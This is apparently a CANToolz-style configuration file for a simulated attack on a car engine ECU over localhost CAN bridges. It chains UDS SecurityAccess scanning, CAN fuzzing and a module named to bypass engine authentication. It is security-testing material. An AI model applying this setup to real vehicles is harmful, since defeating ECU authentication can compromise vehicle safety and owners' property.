load_modules = {
    ########### Attacker

    'uds_engine_auth_baypass': {
         'id_command': 0x71
    },

    'gen_ping' :    {},


    'uds_tester_ecu_engine':{
        'id_uds': 0x701,
        'uds_shift': 0x08,
        'uds_key':''
    },

    'hw_TCP2CAN':    {'port': 1111, 'mode': 'client', 'address':'127.0.0.1', 'debug':3},
    'hw_TCP2CAN~1':    {'port': 1112, 'mode': 'client','address':'127.0.0.1', 'debug':3},
    'gen_fuzz':{},

    'mod_stat':{},
    'mod_stat~2': {}
}


actions = [

    {'hw_TCP2CAN~1':  {'pipe': 2,'action':'read'}},
    {'hw_TCP2CAN':  {'pipe': 1,'action':'read'}},



    {'gen_ping':    {                    # Generate UDS requests
        'pipe': 3,
        'delay': 0.06,
        'range': [1700, 1800],           # ID range (from 1790 to 1794)
        'services':[{'service': 0x27, 'sub': 0x01}],
        'mode':'UDS'}
    },





    {'mod_stat':    {'pipe': 2}},
    {'mod_stat~2':    {'pipe': 1}},


    {'uds_tester_ecu_engine':
        {
        'action': 'read',
        'pipe': 1
        }
    },


    {'uds_tester_ecu_engine': {
         'action': 'write',
         'pipe': 3}},

    {'gen_fuzz':{
        'id':[0x81],'data':[0,0],'index':[0,1],'delay':0.07,'pipe':4,'bytes':(0,0x20)

    }},

      {'uds_engine_auth_baypass':   {
         'action': 'write',
         'pipe': 4}},

    {'hw_TCP2CAN':  {'pipe': 3,'action':'write'}},
    {'hw_TCP2CAN~1':  {'pipe': 4,'action':'write'}}






    ]